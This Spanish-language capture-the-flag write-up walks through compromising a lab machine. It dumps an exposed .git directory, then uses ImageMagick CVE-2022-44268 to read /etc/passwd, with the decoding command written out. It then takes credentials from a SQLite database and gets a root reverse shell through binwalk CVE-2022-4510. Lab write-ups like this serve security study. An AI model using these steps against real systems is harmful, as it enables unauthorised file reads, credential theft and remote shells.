--------
- Tags: #binwalk #sqlite3 #image-magic #git_dumper #Arbitrary-File-Read #CVE-2022-4510
--------------
## Técnicas utilizadas
- .Git abuse[git_dumper.py]
- Arbitrary File Read[imagemagick]
- Database enumeration
- BinWalk abuse[CVE-2022-4510]
## Procedimiento

![[Pasted image 20230624121725.png]]

#### Reconocimiento

El escaneo con **nmap** nos presenta los siguientes puertos abiertos:
``` ruby
# nmap -sCV -p80,22 10.129.33.41 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-24 12:19 MST
Nmap scan report for 10.129.33.41
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.83 seconds
```

El reconocimiento con **WhatWeb** nos muestra las tecnologías que corren por detras del sitio web:
``` ruby
# whatweb pilgrimage.htb
http://pilgrimage.htb [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.129.33.41], JQuery, Script, Title[Pilgrimage - Shrink Your Images], nginx[1.18.0]
```

#### .Git abuse[git_dumper.py]
Enumernado la pagina, pude encontrar un **XSS** que no llevaba realmente a ningun sitio. Intente también tratando de subir una **webshell** pero tampoco funciono. Haciendo un escaneo más profundo con **wfuzz** di con el directorio **.git**

```
# curl -s -X GET "http://pilgrimage.htb/.git/HEAD"
ref: refs/heads/master
```

Como sabemos, cuando el directorio **.git** esta expuesto, podemos aprovecharnos para clonar el repositorio completo con herramientas como [git_dumper.py](https://github.com/arthaud/git-dumper/) de la siguiente manera:

```
# git_dumper.py http://<url>/ <dir>
```

--------
#### Arbitrary File Read[imagemagick]
Leyendo los archivos del repositorio no encontramos nada interesante, sin embargo, encontramos el binario de **ImageMagick** que esta utilizando para convertir las imagenes.
Si listamos la version de **ImageMagick** podemos ver que es algo antigua:
```
./magick --version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

Si buscamos por vulnerabilidades existentes con **searchsploit** para la versión en uso, encontramos que hay una para leer archivos de la maquina:
![[searchsploit_magick.png]]

La prueba de concepto nos pide que clonemos el [repositorio](https://github.com/voidz0r/CVE-2022-44268). Una vez clonado, tenemos que ejeecutar el sigueinte comando:
```
# cargo run "/etc/passwd"
```

Esto nos creara un **image.png**, este mismo es el que usaremos para leer el */etc/passwd* del servidor. Tenemos que subir la imagen y la pagina nos ofecera un **url**, usamos **wget** para descargar la imagen en el directorio actual de trabajo. Una vez con la imagen en nuestro espacio de trabajo, ejecutaremos el siguiente comando:
```
# identify -verbose 6497a141931ed.png | awk '/Raw profile type:/,/signature:/' | sed 's/signature.*//' | sed 's/Raw profile type.*//' | sed '/^\s*$/d' | sed '1d' | xxd -ps -r
```

Esto nos listara el */etc/passwd*:
```java
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

---------
#### Database enumeration
En el archivo **login.php** del repositorio hace alución a una ruta donde se encuentra una base de datos. Hacemos el proceso anterior pero ahora con el este archivo e intentamos enumerarla con **sqlite3**:
```
# sqlite3 db.db
```

Dentro de la base de datos, vemos que existe una **table** con nombre **users**. Si la listamos, podemos ver un usuario y una contraseña:
![[leak_users.png]]

Estas credenciales nos sirven para conectarnos a la maquina por **SSH**

---------
#### BinWalk abuse[CVE-2022-4510]
Una vez estamos como **emily** podemos hechar un vistazo a los procesos del sistema con *ps -faux* y nos mostrara el siguiente proceso que esta ejecutando **root**:
![[root_process.png]]
El script que esta ejecutando **root** en cuestion es el siguiente:

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"* ]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done
```

Basicamente, crea una **lista negra**, ejecuta **inotifywait** en bucle con los parametros *-m -e*, estos dos en conjunto sirven para  constantemente ver si se crean archivos en la ruta definida. Posteriormente se declara la función **filename** que toma como valor el nombre de los archivos a través de una expresion regular y antepone la palabra **CREATE**. Un ejemplo seria:
```
CREATE hola.sh
```

La parte interesante viene a continuación, ya que ejecuta **binwalk -e**, esto va a permitir aprovecharnos de una vulnerabilidad de la version actual de **binwalk**
Si buscamos por exploit para la versión actualmente en uso de **binwalk** encontramos un **RCE**:
![[binwalk_rce.png]]

El funcionamiento del script es facil, simplemente colocamos un archivo a modificar, colocamos nuestra **ip** y un puerto por donde estaremos en escucha y nos deja un archivo como este:
![[png_rce.png]]

Nos vamos poner en escucha por el puerto elegido. El archivo generado lo vamos a trasladar a la maquina victima y lo vamos a colocar en la carpeta */var/www/pilgrimage.htb/shrunk/*. Esto automaticamente nos mandara una **reverse shell** a nuestro equipo y podremos leer la flag de root:
![[root.png]]






